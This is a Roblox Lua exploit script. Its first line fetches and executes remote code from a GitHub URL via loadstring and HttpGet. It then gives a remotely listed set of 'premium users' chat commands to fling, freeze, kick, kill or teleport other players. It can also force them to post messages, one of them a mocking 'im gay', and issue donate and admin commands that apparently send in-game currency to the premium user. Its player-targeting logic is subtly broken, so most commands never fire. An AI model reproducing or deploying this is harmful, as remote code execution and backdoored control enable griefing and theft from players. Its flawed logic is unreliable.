
local premiumUsers = loadstring(game:HttpGet('https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Okay'))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local ChatService = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents

local function getPlayerByName(name)
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            return p
        end
    end
    return nil
end

local function freeze(character)
    if character then
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
    end
end

local function unfreeze(character)
    if character then
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            end
        end
    end
end

local function isPremiumUser(player)
    for _, user in ipairs(premiumUsers) do
        if user and user.Name == player.Name then
            return true
        end
    end
    return false
end

local function handleChatCommands(premiumUser)
    if not premiumUser then return end
    local connection
    connection = premiumUser.Chatted:Connect(function(msg)
        local player = Players:GetPlayerFromCharacter(premiumUser.Character)
        if not player then return end
        local character = player.Character
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local upperTorso = character and character:FindFirstChild("UpperTorso")
        local lowerTorso = character and character:FindFirstChild("LowerTorso")
        local isNotSelf = player ~= premiumUser
        if msg:match("^%.fling%s*%.") then
            if isNotSelf and hrp then
                hrp.CFrame = CFrame.new(0, 999, 0)
                local power = 99999999
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
                local force = Instance.new("BodyThrust", hrp)
                force.Force = Vector3.new(power, 0, power)
                Debris:AddItem(force, 2)
            end
        elseif msg:match("^%.freeze%s*%.") then
            if isNotSelf then freeze(character) end
        elseif msg:match("^%.unfreeze%s*%.") then
            if isNotSelf then unfreeze(character) end
        elseif msg:match("^%.kxck%s*%.") then
            if isNotSelf then premiumUser:Kick("You have been kicked.") end
        elseif msg:match("^%.oof%s*%.") then
            if isNotSelf and humanoid then humanoid:Destroy() end
        elseif msg:match("^%.error%s*%.") then
            if isNotSelf and hrp then hrp.CFrame = CFrame.new(99999, 99999, 99999) end
        elseif msg:match("^%.bring%s*%.") then
            if isNotSelf and upperTorso and premiumUser.Character then
                local targetPos = premiumUser.Character:FindFirstChild("UpperTorso") and premiumUser.Character.UpperTorso.Position
                if targetPos then
                    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                end
            end
        elseif msg:match("^%.sit%s*%.") then
            if isNotSelf and humanoid then humanoid.Sit = true end
        elseif msg:match("^%.unsit%s*%.") then
            if isNotSelf and humanoid then humanoid.Sit = false end
        elseif msg:match("^%.troll%s*%.") then
            if isNotSelf then
                ChatService.SayMessageRequest:FireServer("im gay", "All")
            end
        elseif msg:match("^%.enlighten%s*%.") then
            if isNotSelf and character then
                local tool = premiumUser.Backpack:FindFirstChild("The Arkenstone")
                if tool then
                    tool:Equip()
                end
                game.Players:Chat(";enlighten " .. premiumUser.Name)
            end
        elseif msg:match("^%.donate%s+(.+)") then
            local amount = msg:match("^%.donate%s+(.+)")
            if isNotSelf then
                game.Players:Chat(";donate " .. amount .. " " .. premiumUser.Name)
            end
        elseif msg:match("^%.say%s+(.+)") then
            local text = msg:match("^%.say%s+(.+)")
            if isNotSelf then
                ChatService.SayMessageRequest:FireServer(text, "All")
            end
        elseif msg:match("^%.cmd%s+(.+)") then
            local cmdText = msg:match("^%.cmd%s+(.+)")
            if isNotSelf then
                game.Players:Chat(player.Name, ";" .. cmdText)
            end
        elseif msg:match("^%.cmdx") then
            if player == premiumUser then
                StarterGui:SetCore("SendNotification", {
                    Title = "Commands",
                    Text = ".freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd",
                    Duration = 5,
                    Icon = "rbxassetid://999999999"
                })
            end
        end
    end)
end

for _, user in ipairs(premiumUsers) do
    handleChatCommands(user)
end
